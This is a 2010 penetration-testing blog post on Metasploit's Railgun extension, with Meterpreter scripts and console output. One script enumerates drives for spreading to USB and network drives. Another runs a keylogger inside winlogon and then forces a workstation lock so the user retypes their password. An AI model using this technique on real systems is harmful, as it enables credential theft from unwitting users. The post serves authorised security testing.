Back on June 13th, "Patrick HVE" released RAILGUN:

[http://mail.metasploit.com/pipermail/framework/2010-June/006382.html](http://mail.metasploit.com/pipermail/framework/2010-June/006382.html)

And it was merged into the the Metasploit trunk with 9709, 9710, 9711 and 9712:
[http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712](http://www.metasploit.com/redmine/projects/framework/repository/revisions/9712)

Basically what this allows you to do is make Windows API calls from Meterpreter without compiling your own DLL. It currently supports a number of Windows API dlls:

  * iphlpapi
  * ws2_32
  * kernel32
  * ntdll
  * user32
  * advapi32

(You can find out exactly what functions are available by default in the api.rb file)

It's also very extensible, it doesn't have a DLL or function you need? But you can read all about in the manual:

`./external/source/meterpreter/source/extensions/railgun/railgun_manual.pdf`

Here are two examples where this comes in very handy:

## List Drives:

The problem that I've had on a number of pentests is that you get shell, but from CMD or Meterpreter there is no good way to find all of the volumes (drives) attached.

  * net use - Shows you what Network drives are connected, but not physical ones
  * fsutil fsinfo drives - You must be an administrator to ride this train
  * fdisk /status - Only on OLD versions of DOS, not sure when this disappeared

But railgun solves this problem with a really short script:

```ruby
# Load the Railgun plugin  **_Update: You no longer need this step_**  
# client.core.use("railgun")   
# Make the API call to enum drive letters   
a = client.railgun.kernel32.GetLogicalDrives()["return"]         
# Math magic to convert the binary to letters        
drives = []         
letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"         
(0..25).each do |i|        
	test = letters[i,1]        
	rem = a % (2**(i+1))        
	if rem > 0        
		drives << test        
		a = a - rem        
	end        
end         
print_line("Drives Available = #{drives.inspect}")
```

**Output**: `Drives Available = ["A", "C", "D", "P", "X"]`

Save this as a meterpreter script and it'll print every logical drive attached to the system even as a limited user (that the user can see).

Logical drives include: (hdd, network, mass storage, optical, etc). This opens up the doors to infecting USB sticks and network drivesâ€¦

## JEDI KEYLOGGING:

One of the problems with keylogging is you never know when that person will log in, and if you're using a client side, they have probably already logged in and you're hoping they log into a portal or some other password protected site.

Railgun to the rescue again:

```ruby
# Start the keylogger running in the background dumping keys every 15 seconds, attached to Winlogon**   

meterpreter > bgrun keylogrecorder -c 1 -t 15        
[*] Executed Meterpreter with Job ID 0        
meterpreter > [*] winlogon.exe Process found, migrating into 640        
[*] Migration Successful!!        
[*] Starting the keystroke sniffer...        
[*] Keystrokes being saved in to /root/.msf3/logs/scripts/keylogrecorder/192.168.92.122_20100707.4539.txt        
[*] Recording         
  
# Drop to IRB to initialize railgun and lockout the workstation, forcing the user to use their credentials again.**

meterpreter > irb       
[*] Starting IRB shell        
[*] The 'client' variable holds the meterpreter client

client.core.use("railgun")       
=> true        
client.railgun.user32.LockWorkStation()        
=> {"GetLastError"=>0, "return"=>true}        
exit        
meterpreter >
```

Set up "tail -f" going on the log file for the keylogger and then kill the keylogger when you've gotten what you came for.

```
meterpreter > bglist       
[*] Job 0: ["keylogrecorder", "-c", "1", "-t", "15"]        
meterpreter > bgkill 0        
[*] Killing background job 0...        
meterpreter >
```

Hope you have fun with railgun and shoot me an email [mubix@hak5.org](mailto:mubix@hak5.org) or leave a comment if you have any other crazy uses for railgun.
